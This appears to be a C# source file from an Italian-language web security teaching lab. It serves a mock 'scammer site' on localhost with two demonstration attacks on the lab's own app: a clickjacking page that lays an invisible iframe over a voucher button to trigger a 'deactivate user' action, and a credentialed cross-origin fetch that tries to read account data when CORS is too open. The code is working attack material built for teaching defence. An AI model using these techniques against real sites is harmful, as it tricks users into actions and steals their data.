namespace Fortino.Web.Chapters.Ch04.Attacker;

// Il "sito del truffatore" per le prove a mano del capitolo 4. Lo serve lo stesso Fortino, ma su
// un altro indirizzo, https://localhost:5002: per il browser è un'altra origine (cambia la porta),
// quindi le regole sulle cornici (4.1) e sul CORS (4.2) si comportano come con un sito esterno.
// Le due pagine esistono solo su quella porta: da https://localhost:5001 non si trovano.
public static class AttackerSite
{
    public const string Host = "localhost:5002";

    // L'indirizzo di Fortino, il sito preso di mira.
    private const string Fortino = "https://localhost:5001";

    public static void Map(IEndpointRouteBuilder app)
    {
        var site = app.MapGroup("").RequireHost(Host).AllowAnonymous();
        site.MapGet("/", () => Results.Content(Index, "text/html"));
        site.MapGet("/buono", () => Results.Content(Voucher, "text/html"));
        site.MapGet("/conto", () => Results.Content(Account, "text/html"));
    }

    private static string Page(string title, string body) =>
        $$"""
        <!doctype html><html lang="it"><head><meta charset="utf-8">
        <title>{{title}}</title>
        <style>
          body { font-family: system-ui, sans-serif; margin: 0; background: #f6f3ee; color: #2b2b2b; }
          .wrap { max-width: 760px; margin: 0 auto; padding: 32px; }
          .flag { background: #7a1f1f; color: #fff; padding: 8px 16px; font-size: 14px; }
          .card { background: #fff; border: 1px solid #e0d8cc; border-radius: 12px; padding: 28px; }
          button { font-size: 16px; padding: 12px 22px; border: 0; border-radius: 8px;
                   background: #0d6efd; color: #fff; cursor: pointer; }
        </style></head><body>
        <div class="flag">Pagina del Laboratorio di Fortino — finge di essere un sito esterno (porta 5002).</div>
        <div class="wrap">{{body}}</div></body></html>
        """;

    private static readonly string Index = Page("Sito del truffatore",
        """
        <div class="card">
          <h1>Sito del truffatore</h1>
          <p>Due pagine di esempio usate nelle prove del capitolo 4:</p>
          <ul>
            <li><a href="/buono">/buono</a> — caso 4.1, la pagina incorniciabile (clickjacking).</li>
            <li><a href="/conto">/conto</a> — caso 4.2, CORS troppo aperto.</li>
          </ul>
        </div>
        """);

    // Caso 4.1. L'esca: un bottone visibile «Riscuoti». Sopra, trasparente, c'è incorniciata la
    // pagina «Utenti» di Fortino, spostata in modo che il suo bottone «Disattiva» cada esattamente
    // sotto «Riscuoti». La casella «Mostra la cornice» la rende visibile, così si vede il trucco.
    private static readonly string Voucher = Page("Hai vinto un buono",
        $$"""
        <div class="card" style="position:relative">
          <div style="position:relative;z-index:100;background:#fff">
            <h1>Hai vinto un buono da 50 €</h1>
            <p>Premi il bottone per riscuoterlo.</p>
            <label style="display:block;margin-bottom:16px;font-size:14px">
              <input type="checkbox" id="reveal"> Mostra la cornice nascosta
            </label>
          </div>
          <div style="position:relative;width:320px;height:60px">
            <button style="position:absolute;top:0;left:0;z-index:1">Riscuoti il buono</button>
            <iframe id="frame" src="{{Fortino}}/users"
                    style="position:absolute;top:-318px;left:-700px;width:900px;height:760px;
                           border:0;opacity:0.001;z-index:2"></iframe>
          </div>
        </div>
        <script>
          document.getElementById('reveal').addEventListener('change', e => {
            document.getElementById('frame').style.opacity = e.target.checked ? '0.6' : '0.001';
          });
        </script>
        """);

    // Caso 4.2. La pagina prova a leggere, dal browser dell'utente collegato, il riepilogo del
    // portale di Fortino: una chiamata "da un altro sito", con i cookie (credentials: include).
    // Se il server dà il permesso CORS, il testo dei dati compare qui; altrimenti il browser
    // blocca la lettura e si scrive l'errore.
    private static readonly string Account = Page("Offerta riservata",
        $$"""
        <div class="card">
          <h1>Offerta riservata</h1>
          <p>Stiamo caricando la tua situazione dal gestionale…</p>
          <pre id="out" style="white-space:pre-wrap;background:#f0ece4;padding:16px;border-radius:8px">attendere…</pre>
        </div>
        <script>
          fetch('{{Fortino}}/portal/api/situazione', { credentials: 'include' })
            .then(r => r.json())
            .then(d => { document.getElementById('out').textContent =
              'Dati letti dal sito del truffatore:\n' + JSON.stringify(d, null, 2); })
            .catch(e => { document.getElementById('out').textContent =
              'Il browser ha bloccato la lettura (CORS): ' + e; });
        </script>
        """);
}
